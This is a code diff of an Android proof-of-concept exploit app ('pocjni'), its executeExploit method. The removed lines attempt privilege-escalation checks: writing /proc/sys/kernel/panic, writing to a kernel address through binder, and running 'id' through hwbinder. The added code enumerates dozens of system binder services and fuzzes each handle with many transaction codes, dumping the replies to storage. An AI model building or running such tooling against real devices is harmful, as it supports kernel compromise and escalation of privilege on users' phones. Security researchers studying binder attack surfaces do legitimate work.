@@ -53,14 +53,12 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
+    // Native methods
     public static native int nativeOpenDevice(String path);
-    public static native String nativeTestFd(int fd);
     public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
-    public static native byte[] nativeBinderPing(int fd);
     public static native byte[] nativeBinderGetService(int fd, String serviceName);
-    public static native byte[] nativeBinderReadReply(int fd, int handle, int code, int flags);
-    public static native String nativeBinderWriteMemory(int fd, int handle, int code, long address, long value);
-    public static native String nativeBinderExecCommand(int fd, int handle, int code, String command);
+    public static native byte[] nativeBinderPing(int fd);
+    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, String filename);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -170,7 +168,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== FINAL VERIFICATION ==========");
+        appendLog("========== BINDER SERVICE EXPLORATION ==========");
 
         int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
         int binderFd = nativeOpenDevice("/dev/binder");
@@ -184,34 +182,75 @@ public class MainActivity extends AppCompatActivity {
         String devName = (hwbinderFd >= 0) ? "/dev/hwbinder" : "/dev/binder";
         appendLog("[+] Using " + devName + " fd=" + fd);
 
-        appendLog("[FINAL] Step 1: Attempting privileged operation (write to /proc/sys/kernel/panic)");
-        String panicResult = nativeWriteFile("/proc/sys/kernel/panic", "1");
-        appendLog("[FINAL] Write to /proc/sys/kernel/panic result: " + (panicResult != null ? panicResult : "null"));
-
-        appendLog("[FINAL] Step 2: Attempting to write 0x01234567 to kernel address via binder (handle=0, code=1)");
-        String memWrite = nativeBinderWriteMemory(fd, 0, 1, 0x01234567L, 0x01234567L);
-        appendLog("[FINAL] Binder write memory result: " + memWrite);
-
-        appendLog("[FINAL] Step 3: Dumping binder reply data to /sdcard/Download");
-        byte[] reply = nativeBinderReadReply(fd, 0, 0, 0);
-        if (reply != null && reply.length > 0) {
-            File dumpDir = getDumpDir();
-            if (dumpDir != null) {
-                File out = new File(dumpDir, "binder_reply_dump.bin");
-                try (FileOutputStream fos = new FileOutputStream(out)) {
-                    fos.write(reply);
-                    appendLog("[FINAL] Dumped " + reply.length + " bytes to " + out.getAbsolutePath());
-                } catch (Exception e) {
-                    appendLog("[FINAL] Failed to dump: " + e.getMessage());
-                }
-            }
+        // Ping test
+        appendLog("[*] Sending PING (code=0xFFFFFFFE, handle=0)");
+        byte[] pingReply = nativeBinderPing(fd);
+        if (pingReply != null) {
+            appendLog("[PING] Reply len=" + pingReply.length + " (dumped)");
+            dumpToFile(pingReply, "binder_ping_reply.bin");
         } else {
-            appendLog("[FINAL] No reply data received");
+            appendLog("[PING] No reply or error");
         }
 
-        appendLog("[FINAL] Step 4: Attempting to execute command 'id' via hwbinder (handle=0, code=1)");
-        String execResult = nativeBinderExecCommand(fd, 0, 1, "id");
-        appendLog("[FINAL] Exec result: " + execResult);
+        // List of common Android system services
+        String[] services = {
+            "surfaceflinger", "media.camera", "media.player", "media.extractor",
+            "audio", "display", "sensors", "power", "package", "activity",
+            "window", "input", "bluetooth", "wifi", "telephony.registry",
+            "telecom", "phone", "connectivity", "netd", "wificond",
+            "usb", "vibrator", "alarm", "battery", "meminfo",
+            "gfxinfo", "cpuinfo", "dbinfo", "device_policy",
+            "statusbar", "clipboard", "country_detector", "search",
+            "wallpaper", "notification", "location", "jobscheduler",
+            "backup", "appwidget", "dreams", "graphicsstats",
+            "print", "media_session", "media_router", "restrictions",
+            "companiondevice", "shortcut", "launcherapps", "crossprofileapps",
+            "slice", "media.projection", "autofill", "imms",
+            "statscompanion", "connmetrics", "contexthub",
+            "sec_key_att_app_id_provider", "scheduling_policy",
+            "telephony.registry", "account", "content", "overlay",
+            "settings", "dropbox", "processinfo", "vibrator",
+            "consumer_ir", "alarm", "window", "input",
+            "package_native", "permission", "dbinfo", "cpuinfo",
+            "gfxinfo", "otadexopt", "network_watchlist", "meminfo",
+            "user", "activity", "procstats", "pinner",
+            "device_identifiers", "batterystats", "appops", "power",
+            "recovery", "display", "package", "sensorservice"
+        };
+
+        // 1. Get services and dump handles
+        appendLog("[*] Attempting to get service handles...");
+        for (String svc : services) {
+            if (stopRequested.get()) break;
+            appendLog("[GETSVC] Requesting '" + svc + "'");
+            byte[] reply = nativeBinderGetService(fd, svc);
+            if (reply != null && reply.length >= 4) {
+                int handle = ((reply[0] & 0xFF) |
+                              ((reply[1] & 0xFF) << 8) |
+                              ((reply[2] & 0xFF) << 16) |
+                              ((reply[3] & 0xFF) << 24));
+                appendLog("[GETSVC] '" + svc + "' -> handle=" + handle + " (0x" + Integer.toHexString(handle) + ")");
+                dumpToFile(reply, "getsvc_" + svc + ".bin");
+                // Store for later interaction
+                if (handle != 0) {
+                    exploreService(fd, handle, svc);
+                }
+            } else {
+                appendLog("[GETSVC] '" + svc + "' -> no reply or invalid");
+            }
+        }
+
+        // 2. Also try handle 0 with various codes (context manager)
+        int[] codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0x10, 0x20, 0xFFFFFFFE};
+        for (int code : codes) {
+            if (stopRequested.get()) break;
+            appendLog("[TX] handle=0 code=0x" + Integer.toHexString(code));
+            String result = nativeBinderDumpReply(fd, 0, code, 0, "tx_handle0_code" + code + ".bin");
+            appendLog("[TX] " + result);
+        }
+
+        // 3. Additional: try sending empty transaction to some handles we got earlier (if any)
+        // We'll collect handles from successful gets; but we already explore each service above.
 
         if (hwbinderFd >= 0) try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}
         if (binderFd >= 0) try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
@@ -225,8 +264,36 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    // Helper to write file (for step 1)
-    private native String nativeWriteFile(String path, String content);
+    // Explore a specific service handle: send transactions with various codes and dump replies
+    private void exploreService(int fd, int handle, String serviceName) {
+        appendLog("[EXPLORE] Service '" + serviceName + "' handle=" + handle);
+        int[] codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
+        for (int code : codes) {
+            if (stopRequested.get()) break;
+            String fname = "svc_" + serviceName + "_code" + code + ".bin";
+            String result = nativeBinderDumpReply(fd, handle, code, 0, fname);
+            appendLog("[EXPLORE] " + serviceName + " code " + code + " -> " + result);
+        }
+        // Also try oneway flag (TF_ONE_WAY = 0x01)
+        for (int code : codes) {
+            if (stopRequested.get()) break;
+            String fname = "svc_" + serviceName + "_code" + code + "_oneway.bin";
+            String result = nativeBinderDumpReply(fd, handle, code, 1, fname);
+            appendLog("[EXPLORE] " + serviceName + " code " + code + " (oneway) -> " + result);
+        }
+    }
+
+    private void dumpToFile(byte[] data, String filename) {
+        File dir = getDumpDir();
+        if (dir == null || data == null) return;
+        File file = new File(dir, filename);
+        try (FileOutputStream fos = new FileOutputStream(file)) {
+            fos.write(data);
+            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
+        } catch (Exception e) {
+            appendLog("[DUMP] Failed to save " + filename + ": " + e.getMessage());
+        }
+    }
 
     private File getDumpDir() {
         if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
